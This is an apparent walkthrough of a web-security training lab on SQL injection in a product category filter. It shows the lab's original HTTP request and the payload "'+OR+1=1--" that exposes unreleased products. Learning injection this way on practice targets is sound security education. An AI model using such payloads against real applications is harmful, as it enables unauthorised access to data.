# Lab: SQL injection vulnerability in WHERE clause allowing retrieval of hidden data
## Task
This lab contains an SQL injection vulnerability in the product category filter. When the user selects a category, the application carries out an SQL query like the following:

`SELECT * FROM products WHERE category = 'Gifts' AND released = 1`

To solve the lab, perform an SQL injection attack that causes the application to display details of all products in any category, both released and unreleased.

## Solution
Originally, the request is:
```
GET /filter?category=Lifestyle HTTP/1.1
Host: ac121f771f9ff00880be049000820026.web-security-academy.net
Cookie: session=bOEATUMEQ2ayDYjeCHVB7JWdGOysKyIi
Sec-Ch-Ua: " Not A;Brand";v="99", "Chromium";v="92"
Sec-Ch-Ua-Mobile: ?0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://ac121f771f9ff00880be049000820026.web-security-academy.net/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close
```

To display all products, we just need to modify the search sequence as follows:
```
/filter?category=Lifestyle'+OR+1=1--
```

![image](https://user-images.githubusercontent.com/44528004/130056083-5b6f8628-0a0e-4be8-8d78-657419f677eb.png)

> Done!
